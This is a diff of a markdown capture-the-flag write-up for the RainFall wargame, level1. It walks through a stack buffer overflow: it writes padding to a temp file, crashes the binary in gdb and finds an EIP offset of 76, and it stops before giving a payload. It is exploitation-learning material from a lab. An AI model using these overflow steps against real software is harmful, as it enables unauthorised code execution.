@@ -26,9 +26,19 @@ level1
 	```assembly
 	sub    $0x50,%esp
 	```
-	This time the buffer isn't quite big but still I wont write char one by one so we will use python like this : `$(python -c "print('x') * y")`
+*	Instead of using python I made a little [program](source/randomStr.sh) in shell to get a random string of `x` char
+	```console
+	level1@RainFall:~$ echo str > /tmp/exlpoit
+	```
 *	Since this program is more of a buffer *over-READ* issue, we need to put our exploit in a file instead of doing it on the terminal directly
 	```console
-	level1@RainFall:~$ python -c 'print "\x90" * 80' > /tmp/exploit
 	level1@RainFall:~$ gdb ./level1
+	(gdb) r < /tmp/exploit
+	Starting program: /home/user/level1/level1 < /tmp/exploit
+
+	Program received signal SIGSEGV, Segmentation fault.
+	0x63413563 in ?? ()
 	```
+*	I found this [website](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/) to get calculate the offset and it is `76`
+*	Now all we need to to is make a string of 76 characters and add the exploit after those
+*	
